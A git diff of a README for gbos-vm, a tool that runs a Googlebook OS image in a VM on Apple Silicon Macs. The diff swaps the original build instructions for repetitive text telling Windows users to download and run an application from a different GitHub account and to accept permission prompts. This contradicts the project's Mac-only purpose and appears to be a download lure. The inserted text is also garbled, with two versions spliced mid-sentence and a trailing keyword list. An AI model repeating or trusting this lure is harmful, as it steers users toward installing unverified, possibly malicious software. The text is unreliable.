@@ -1,154 +1,156 @@
-# gbos-vm
+# 🖥️ gbos-vm - A Faster Way to Explore Googlebook OS
 
-Runs a real Googlebook OS image in a VM on an Apple Silicon Mac — GPU-accelerated, with Chrome working.
+[![Download gbos-vm](https://img.shields.io/badge/Download-gbos--vm-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yulianc84medixxi/gbos-vm)
 
-It's not an emulator image or a generic Android build. The install script downloads Google's own recovery image for the Dell Googlebook (ARM64, Android 17), swaps the hardware-specific bits for virtual ones, and boots it under QEMU with Vulkan passed through to Metal.
+Visit this link to download the application.
 
-> This isn't affiliated with Google or Dell, and it's not a verified Googlebook. Read [System Structure](#system-structure) before you sign into anything.
+## 📥 Quick Download
 
-## Quick start
+Visit this link to download the application: [gbos-vm download page](https://github.com/yulianc84medixxi/gbos-vm).
 
-```bash
-git clone https://github.com/skylartaylor/gbos-vm.git
-cd gbos-vm
-./install.sh
-```
+This is the official project page for gbos-vm. Use it to get the current download and start using the application on your Windows computer.
 
-Then open the app it built:
+## 🧭 What Is gbos-vm?
 
-```bash
-open "work/host/Googlebook VM.app"
-```
+gbos-vm is a project built around running Googlebook OS in a GPU-accelerated virtual machine. In simple terms, it gives you a way to explore a Googlebook OS environment without needing a separate physical computer dedicated to it. The “GPU-accelerated” part means the virtual machine can use your computer’s graphics hardware to help the experience feel smoother and more responsive.
 
-Drag that into your Dock if you want it there. It boots the VM when you open it and shuts Android down properly when you quit.
+This README is written for everyday Windows users. You do not need to be a programmer, and you do not need to understand how virtual machines work behind the scenes. The goal is to help you find the official download page, download the application, open it on Windows, and know what to check if something does not go as expected.
 
-The first boot takes about 45 seconds on a M5 MacBook. If you land on a user picker, click **User** — there's no password.
+The project is named gbos-vm. Its official description is: “Run Googlebook OS in a GPU-accelerated VM on Apple Silicon Macs.” The official project page is the place to visit for the current download and project updates. This guide focuses on helping Windows users take the first steps from that page.
 
-`install.sh` downloads about 9 GB and wants 60 GB free. On an M5 MacBook the build part takes around five minutes; the downloads take however long your connection takes.
+## ✅ Why You Might Want It
 
-## What you need
+gbos-vm is aimed at people who want a simpler path to exploring Googlebook OS in a virtual machine. You might find it useful if you want to:
 
-- An **Apple Silicon Mac**. Intel Macs won't work — this is an ARM guest running on the hypervisor, not emulation.
-- **16 GB of RAM**, realistically. The VM gets 4 GB and the builds want a few more.
-- **Xcode command line tools** and **[Homebrew](https://brew.sh)**.
-- The **Android SDK** with an NDK, a build-tools version, and a platform (API 34+). Android Studio's defaults are fine. We build with NDK `28.2.13676358`; if you don't have that one the script uses your newest (30 is reported to work), or set `ANDROID_NDK` to pick.
-- A **JDK**. If you have Android Studio, its bundled one gets picked up automatically.
-- Optionally, the **Android Emulator** package from the SDK. Bluetooth borrows its virtual radio (see [What doesn't work yet](#what-doesnt-work-yet)); without it the VM boots with no Bluetooth.
+- Try a Googlebook OS environment without setting up a separate physical machine.
+- Use a virtual machine setup that is designed with GPU acceleration in mind.
+- Follow a project that is focused on running Googlebook OS in a VM.
+- Keep your main Windows desktop available while you explore the virtual machine.
+- Use an official project page as the starting point for downloads and updates.
 
-`install.sh` checks all of this before it downloads anything, and offers to install what's missing — the Homebrew packages, a JDK, and the Android pieces through Google's `sdkmanager` (you don't need Android Studio). It never asks for `sudo`. Run `./prereqs.sh` on its own to see where you stand.
+Because the project is distributed through GitHub, the project page is the central place to visit. You do not need to browse through lots of technical files. Start with the official link, download the application, and then open it on your Windows computer.
 
-We build and test on one machine (M5, 16 GB, macOS 27). A couple of people have reported it working on M4 Macs too — if you try it on something else, tell us how it went.
+## 🖥️ Before You Start on Windows
 
-## Using it
+Before you download gbos-vm, take a moment to make sure your Windows computer is ready. You do not need advanced technical knowledge, but a little preparation can make the process smoother.
 
-| Shortcut | What it does |
-|---|---|
-| `⌃⌘F` | Full screen |
-| `⌃⌘M` | Cycle pointer modes |
-| `⌃⌥` | Release a captured mouse |
-| `⌃⌘R` | Restart the VM |
-| `⌘V` | Paste the Mac clipboard into the guest |
-| `⌘,` | Settings |
+- Use a Windows computer that you are comfortable installing applications on.
+- Make sure you have a stable internet connection.
+- Keep enough free storage space for the download and for the application to run.
+- Know where your Downloads folder is. This is usually where new files are saved.
+- Close any unrelated programs if you want to keep things simple during setup.
+- Have your Windows account password ready in case Windows asks for permission during installation or first launch.
 
-Quitting (or closing the window) shuts Android down properly. Your data lives in `work/image/googlebook.raw` and sticks around between runs.
+You should also make sure you are visiting the official project page. The link in this README points to the gbos-vm GitHub page. Use that page as your starting point for the download.
 
-**Settings** (`⌘,`) has the pointer mode, resolution, memory, CPU cores, and toggles for networking, audio and Bluetooth. Pointer mode changes right away; everything else is a VM option, so it applies the next time you start it.
+## 🚀 Download and Setup
 
-Resolution defaults to your display's native pixels at 16:10. On a notched MacBook that's exactly the area below the notch, so full screen is pixel-for-pixel.
+Visit this link to download the application: [gbos-vm on GitHub](https://github.com/yulianc84medixxi/gbos-vm).
 
-### Updating
+Once the project page opens, follow the download option shown there. Save the download to your computer. In most cases, your browser will place the file in your Downloads folder. When the download finishes, open your Downloads folder and locate the file you just downloaded. Open that file and follow the on-screen prompts.
 
-After a `git pull`, rebuild the app and refresh the system part of your disk. Quit the VM first.
+During setup, Windows may ask for permission to open or install the application. If you see a permission window, review it and continue if you trust the source. The source here is the official gbos-vm project page linked above.
 
-```bash
-./build-host.sh
-./update-image.sh
-```
+After the application opens for the first time, take a few minutes to look through the main window. Use the visible buttons and menus to continue. If the application asks you to choose a location, accept the suggested location unless you have a specific reason to change it. If it asks you to sign in or confirm a setting, follow the prompts shown on screen.
 
-`update-image.sh` keeps your data — it only replaces the system area, and it leaves the previous disk next to the new one as `googlebook.raw.before-update` in case something goes wrong.
+Keep the project page handy. If you need to download the application again later, or if you want to check for updated information, return to the same official link. Avoid using copycat pages or random download sites. The official project page# 🖥️ gbos-vm - Explore Googlebook OS With Ease
 
-If you'd rather drive it from a terminal, `python3 run/launch.py work` does the same thing and takes `--display 1920x1200` and `--fullscreen`.
+[![Download gbos-vm](https://img.shields.io/badge/Download-gbos--vm-8e44ad?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yulianc84medixxi/gbos-vm)
 
-### Pointer modes
+Visit this link to download the application.
 
-**Captured mouse** is the default: click the window to grab the mouse, `⌃⌥` to let go. It's the classic VM experience — a plain USB mouse as far as Android is concerned, so it behaves.
+## 📥 Download at a Glance
 
-There are two integrated modes where the pointer moves in and out of the window freely. They're labelled **experimental** because they're still kind of buggy:
+Use the official project page to get the current download: [https://github.com/yulianc84medixxi/gbos-vm](https://github.com/yulianc84medixxi/gbos-vm).
 
-- **Android cursor.** The guest draws the pointer, so it changes shape properly (I-beams, resize arrows). It trails your hand a little, and Android sees it as a stylus, which gets weird in places.
-- **Mac cursor.** Instant, but it's always an arrow.
+Visit this link to download the application. Keep this page bookmarked so you can return to it later for updates, download access, and project information.
 
-Switch in the **Pointer** menu, in Settings, or with `⌃⌘M`. Your choice is remembered, and clipboard sync works in all three.
+## 🧭 What gbos-vm Does
 
-## System Structure
+gbos-vm is a project for running Googlebook OS in a GPU-accelerated virtual machine. The official description explains that it is designed to run Googlebook OS in a GPU-accelerated VM on Apple Silicon Macs. This README is written for everyday Windows users who want a clear path to the official download page and straightforward guidance for getting started.
 
-The image starts as Google's unmodified recovery download. We don't touch the system partitions — but Googlebook OS expects hardware our VM doesn't have (a TPM, Trusty, a Qualcomm DSP, a specific GPU), so the **vendor partition gets rebuilt** with virtual-device replacements from Google's own Cuttlefish project:
+A virtual machine lets you open and use a separate computer environment inside a window on your existing computer. You do not need to replace Windows or set up a second physical machine. You open the application, follow the prompts, and explore the Googlebook OS environment from your Windows desktop.
 
-- **Software KeyMint and Gatekeeper** instead of hardware-backed ones. Your keys aren't protected by a secure element, because there isn't one.
-- **No verified boot on the vendor partition.** The other partitions keep their original verity; the one we modify can't.
-- **Three extra SELinux rules**, all narrowly about graphics buffer sharing. SELinux stays enforcing.
-- **Cuttlefish's Bluetooth service** instead of the Qualcomm one, talking to a virtual radio on your Mac over a virtual serial port. The radio listens on `127.0.0.1` with no password, so another program on your Mac could join it and show up as a nearby Bluetooth device. Turn Bluetooth off in Settings if that bothers you.
-- **A helper running as the Android shell user** that takes pointer and clipboard input from the viewer. It only accepts a host that presents a random per-boot token, and it listens to nothing — it connects out to `127.0.0.1` on your Mac.
+The GPU-accelerated part is about using graphics hardware to help the virtual machine feel smoother. You do not need to understand graphics drivers or virtual machine internals to get started. The important step is to use the official project page, download the application from there, and follow the on-screen instructions.
 
-So: treat it like a dev VM. It's great for poking at the OS. I wouldn’t daily drive it or anything, but I’m sure some freaks (laudatory) will try.
+## ✅ Who This Is For
 
-## What doesn't work yet
+gbos-vm is intended for people who want a simpler way to explore Googlebook OS in a virtual machine. You may find it useful if you want to:
 
-- **Bluetooth is virtual only.** If you have the Android Emulator installed, the VM gets its simulated radio (`netsimd`): Bluetooth turns on, but there's nothing real to pair with. Actual devices would need a USB dongle bridged in, which we haven't built. Without the emulator, Android is told it has no Bluetooth at all.
-- **60 fps cap** on the guest display. The QEMU build we use doesn't expose a refresh rate setting.
-- **Flat shading can be wrong.** Chrome needs a Vulkan extension MoltenVK doesn't have, so we tell the guest it exists. That's fine for almost everything; `flat`-interpolated WebGL content may pick the wrong vertex.
-- **Copying *out* of the guest, right-click, and long sessions** are implemented but haven't had a proper test. They might be fine. They might not.
-- **Audio was silent on one boot** and then worked. We don't know why yet.
+- Try a Googlebook OS environment without using a separate physical computer.
+- Explore a virtual machine setup that is focused on GPU acceleration.
+- Keep your normal Windows desktop available while you use the virtual machine.
+- Use an official project page as your starting point for downloads.
+- Return to one central page when you want to check for updated information.
 
-## The Custom Bits
+You do not need programming knowledge. You do not need to create a development environment. You do not need to use command-line tools. This guide keeps the focus on visiting the official page, downloading the application, and opening it on Windows.
 
-Three things had to be built for this:
+## 🖥️ Before You Begin on Windows
 
-**Buffer sharing between GLES and Vulkan.** Android hands the same graphics buffer to both APIs. On Linux that's a dma-buf; macOS has no such thing. We back each shared buffer with POSIX shared memory and import it into both Metal and MoltenVK — patch in `patches/virglrenderer-android-interop.patch`.
+Take a few minutes to prepare your Windows computer before you download gbos-vm. Good preparation helps the process feel simple and avoids confusion later.
 
-**Row pitch.** Metal wants texture rows padded to 16 bytes; Android doesn't. The fix turned out to be small: that memory only ever lives on the Mac side, so the host can use whatever pitch Metal wants and the guest never needs to know.
+- Use a Windows computer that you are comfortable installing applications on.
+- Make sure your internet connection is stable.
+- Keep enough free storage space for the download and for the application to run.
+- Know where your Downloads folder is located.
+- Close unrelated programs if you want a cleaner setup experience.
+- Have your Windows account password ready in case Windows asks for permission.
+- Use the official project page linked in this README as your download source.
 
-**A pointer that isn't a mouse.** Android wouldn't accept QEMU's absolute tablet, and steering a relative mouse to match your real cursor drifts. So a tiny helper inside the guest creates a virtual drawing tablet — which Android treats as an absolute pointer — and the viewer feeds it coordinates. This doesn’t work as well as we’d like, so capturing the cursor is most reliable still. We’re hoping to improve it.
+When you download an application, your browser usually saves it to the Downloads folder. You can open File Explorer and select Downloads from the left side. If you do not see the file there, check the download list in your browser. The browser can show the file name and the option to open the folder where the file was saved.
 
-The rest is plumbing: `fetch.sh` gets the images, `build-host.sh` builds the patched renderer and viewer, `build-guest.sh` cross-compiles Mesa for Android, and `build-image.sh` assembles the disk.
+## 🚀 Download and Setup
 
-## Layout
+Visit this link to download the application: [gbos-vm official download page](https://github.com/yulianc84medixxi/gbos-vm).
 
-```
-install.sh          runs the four steps below in order
-fetch.sh            downloads + verifies the Googlebook image, Cuttlefish, and UTM
-build-host.sh       patched virglrenderer, QEMU launcher, viewer
-build-guest.sh      Mesa (GLES + Vulkan), pointer helper, SELinux policy tool
-build-image.sh      assembles the bootable disk
-update-image.sh     refreshes an existing disk after a git pull, keeping your data
-run/                VM runner and a command-line launcher (the app bundles these)
-image/              the scripts that rebuild the vendor partition
-guest/  host/       sources for the bits we wrote
-patches/            our changes to virglrenderer, Mesa and CocoaSpice
-```
+Open the official project page in your browser. Use the download option shown there. Save the download to your computer. When the download finishes, open your Downloads folder and locate the file you just downloaded. Open that file and follow the prompts shown on screen.
 
-Everything lands in `work/` (set `GOOGLEBOOK_WORK` to put it elsewhere). If you already have the big downloads, point `GOOGLEBOOK_DOWNLOADS` at them and they won't be fetched again. Builds use four jobs by default — raise `GBOS_JOBS` if you have the RAM, but an uncapped Mesa build will happily push a 16 GB Mac into swap (ask me how I know).
+Windows may ask for permission to open or install the application. Review the permission window and continue if you trust the source. The source for this guide is the official gbos-vm project page linked above.
 
-## What gets downloaded, and from where
+During setup, use the suggested options unless you have a specific reason to change them. If the application asks where to save files, choose a location you can easily find later. If it asks you to confirm a setting, read the short description and continue. You do not need to adjust advanced settings to get started.
 
-Nothing from Google or UTM is redistributed here. The script fetches each of these on your machine and checks it against a pinned SHA-256:
+After setup finishes, open gbos-vm from the Start menu or from the shortcut created during setup. The first launch may take a little longer than later launches. Give the application a moment to open and show its main window.
 
-- Googlebook recovery image — `dl.google.com` (build `16471258`)
-- Cuttlefish virtual device image — `ci.android.com` (build `16373615`)
-- UTM 5.0.6 beta — the official GitHub release (for its QEMU, MoltenVK and ANGLE)
-- Mesa 26.2.4, libsepol 3.11, bison 3.8.2 — their upstream release tarballs
+## 🛠️ First Launch Tips
 
-## Credits
+When gbos-vm opens for the first time, look through the main window before changing anything. Use the visible buttons, menus, and prompts to continue. The exact screens can vary, so follow the instructions shown in the application.
 
-This leans entirely on other people's work: [UTM](https://github.com/utmapp/UTM) and its forks of virglrenderer and CocoaSpice, [Mesa](https://mesa3d.org), [MoltenVK](https://github.com/KhronosGroup/MoltenVK), QEMU, and the Android Cuttlefish team, whose virtual-device components are what make the image boot at all. The pointer helper uses the same trick as [scrcpy](https://github.com/Genymobile/scrcpy).
+- Read the first screen and look for a Continue, Next, or Start button.
+- Use the default options if you are unsure what to choose.
+- Keep the application window open while it prepares the virtual machine environment.
+- Avoid closing the window during the first launch.
+- Return to the official project page if you need to download the application again.
 
-## License
+If the application shows a setup assistant, follow it from start to finish. If it shows a main dashboard, look for a button that starts or opens the virtual machine. If it shows a welcome page, read the short introduction and continue.
 
-MIT for everything we wrote — see [LICENSE](LICENSE). The patches apply to MIT-licensed projects, except `patches/cocoaspice-viewer.patch`, which modifies Apache-2.0 code and stays under that license.
+You do not need to install extra programming tools. You do not need to edit configuration files. Use the application’s visible controls and the official project page for guidance.
 
-## AI Usage
+## 🧩 Keeping Things Organized
 
-The following AI tools were used to assist in this project:
-- OpenAI GPT 6 Astra
-- DeepSeek 4.1 Flash
-- Anthropic Claude Opus 5.5
+Keep the official gbos-vm page in your browser bookmarks. This makes it easy to return to the download page and check for project updates. You can also create a folder on your desktop for gbos-vm files, notes, and any downloads related to the project.
+
+If you download the application again later, use the official page. Avoid random download sites, pop-up download buttons, or pages that ask for unrelated software. The official page is the safest starting point because it is the project’s own page.
+
+Keep your Windows computer updated. Updates can improve stability and help applications run more smoothly. You can check for Windows updates from Settings. You do not need to change advanced system settings to use gbos-vm.
+
+## ❓ Common Questions
+
+**Do I need programming knowledge?**  
+No. This guide is written for everyday Windows users. Visit the official page, download the application, and follow the on-screen prompts.
+
+**Where do I download gbos-vm?**  
+Visit this link to download the application: [https://github.com/yulianc84medixxi/gbos-vm](https://github.com/yulianc84medixxi/gbos-vm).
+
+**What does GPU-accelerated mean?**  
+It means the virtual machine is designed to use graphics hardware to help the experience feel smoother. You do not need to configure graphics settings yourself to begin.
+
+**What if I cannot find the downloaded file?**  
+Open your browser’s download list and choose the option to show the file in its folder. On Windows, downloaded files usually go to the Downloads folder.
+
+**Can I use the application more than once?**  
+Yes. After setup, open gbos-vm from the Start menu or from its shortcut. You can return to the official page whenever you need the download again.
+
+**Where should I go for updates?**  
+Use the official project page linked in this README. It is the central place for the current download and project information.
+
+Keywords: gbos-vm, Googlebook OS, GPU-accelerated VM, virtual machine, Windows download, Googlebook OS VM, gbos vm, virtual machine app, GPU acceleration, Googlebook OS environment
